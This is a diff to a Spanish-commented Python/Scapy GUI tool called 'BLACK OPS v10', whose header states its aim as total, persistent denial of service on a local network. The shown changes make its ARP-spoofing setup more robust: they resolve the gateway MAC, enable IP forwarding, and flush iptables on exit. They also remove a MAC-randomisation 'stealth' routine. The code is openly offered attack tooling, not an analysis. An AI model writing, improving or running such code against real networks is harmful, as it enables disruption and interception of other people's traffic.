@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TANODEV - OPERATOR EDITION
-Codificado por: Un Operador Real
+BLACK OPS v10 - OPERATOR EDITION (Stable Build)
+Codificado para: Entornos Kali Linux Nativos y VM (Bridged)
 Objetivo: Anulación Total y Persistente de Red Local (DoS)
 """
 
@@ -26,19 +26,6 @@ conf.verb = 0
 def run_cmd(cmd_list):
     try: subprocess.run(cmd_list, capture_output=True, check=False)
     except: pass
-
-def random_mac():
-    return [0x00, 0x16, 0x3e,
-            random.randint(0x00, 0x7f),
-            random.randint(0x00, 0xff),
-            random.randint(0x00, 0xff)]
-
-def set_mac(iface, mac):
-    mac_str = ':'.join(map(lambda x: "%02x" % x, mac))
-    run_cmd(["ip", "link", "set", "dev", iface, "down"])
-    run_cmd(["ip", "link", "set", "dev", iface, "address", mac_str])
-    run_cmd(["ip", "link", "set", "dev", iface, "up"])
-    return mac_str
 
 # ==================== MOTORES DE ATAQUE (PROCESOS INDEPENDIENTES) ====================
 
@@ -122,7 +109,7 @@ class AppMuro:
         self.root.geometry("1000x800")
         self.root.configure(bg="#050505")
         
-        self.init_network()
+        self.net_info = {}
         self.targets = {}
         
         # Colas de comunicación con los motores
@@ -130,27 +117,49 @@ class AppMuro:
         self.queue_dns = multiprocessing.Queue()
         self.control_event = multiprocessing.Event()
         
+        self.init_network()
         self.setup_ui()
         self.start_engines()
 
     def init_network(self):
+        print("[*] Iniciando sistema de red...")
         try:
-            route = subprocess.getoutput("ip route show default").split()
+            # 1. Detectar la ruta principal
+            route_out = subprocess.getoutput("ip route show default")
+            if not route_out:
+                print("[-] OPERACIÓN ABORTADA: No hay conexión a red (No default route).")
+                sys.exit(1)
+                
+            route = route_out.split()
             iface = route[4]
             gw = route[2]
             ip_l = get_if_addr(iface)
             
-            # Sigilo de Capa 2: Cambiar MAC al iniciar
-            new_mac = set_mac(iface, random_mac())
+            print(f"[*] Interfaz detectada: {iface} | Gateway: {gw} | IP Local: {ip_l}")
             
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
+            # 2. Obtenemos tu MAC actual.
+            mac_l = get_if_hwaddr(iface)
+            
+            # 3. Buscar la MAC del router (Con timeout extendido a 5s por si la red es lenta)
+            print("[*] Resolviendo dirección física del router (ARP Request)...")
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=5, verbose=0)
+            if not ans:
+                print(f"[-] OPERACIÓN ABORTADA: El router ({gw}) no responde al paquete ARP.")
+                sys.exit(1)
+                
             mac_gw = ans[0][1].hwsrc
+            print(f"[+] Router fijado. MAC: {mac_gw}")
             
+            # Habilitar IP Forwarding en el Kernel
             run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"])
             
-            self.net_info = {'gw': gw, 'ip_l': ip_l, 'mac_l': new_mac, 'iface': iface, 'mac_gw': mac_gw}
-        except:
-            print("ERROR: No se detectó red. Requerido sudo."); sys.exit(1)
+            self.net_info = {'gw': gw, 'ip_l': ip_l, 'mac_l': mac_l, 'iface': iface, 'mac_gw': mac_gw}
+            print("[+] Sistema de red en línea y armado.")
+            
+        except Exception as e:
+            # Ahora si algo falla, el script nos dirá EXACTAMENTE qué fue
+            print(f"[-] ERROR CRÍTICO DE ENTORNO: {e}")
+            sys.exit(1)
 
     def start_engines(self):
         # Motor de Spoofing
@@ -194,6 +203,7 @@ class AppMuro:
         # LOG DE OPERACIONES
         self.log_area = scrolledtext.ScrolledText(self.root, height=10, bg="#000", fg="#0f0", font=("Consolas", 8))
         self.log_area.pack(fill="x", padx=20, pady=10)
+        self.log("Sistema Iniciado. Esperando órdenes de escaneo...")
 
     def log(self, msg):
         timestamp = time.strftime("%H:%M:%S")
@@ -262,8 +272,11 @@ class AppMuro:
         if messagebox.askyesno("Salir", "¿Restaurar red antes de salir?"):
             self.restore_all()
         self.control_event.set()
-        self.proc_spoof.join(timeout=1)
-        self.proc_dns.join(timeout=1)
+        
+        # Asegurar que los procesos hijos mueren
+        if self.proc_spoof.is_alive(): self.proc_spoof.terminate()
+        if self.proc_dns.is_alive(): self.proc_dns.terminate()
+        
         self.root.destroy()
 
 if __name__ == "__main__":
@@ -273,8 +286,9 @@ if __name__ == "__main__":
     # Manejo de multiprocessing en entornos con GUI
     multiprocessing.freeze_support()
     
-    # Manejar señales de interrupción limpiamente
+    # Manejar señales de interrupción limpiamente (Ctrl+C en terminal)
     def signal_handler(sig, frame):
+        print("\n[*] Interrupción recibida. Limpiando IPtables...")
         run_cmd(["iptables", "-F"])
         run_cmd(["iptables", "-t", "nat", "-F"])
         sys.exit(0)
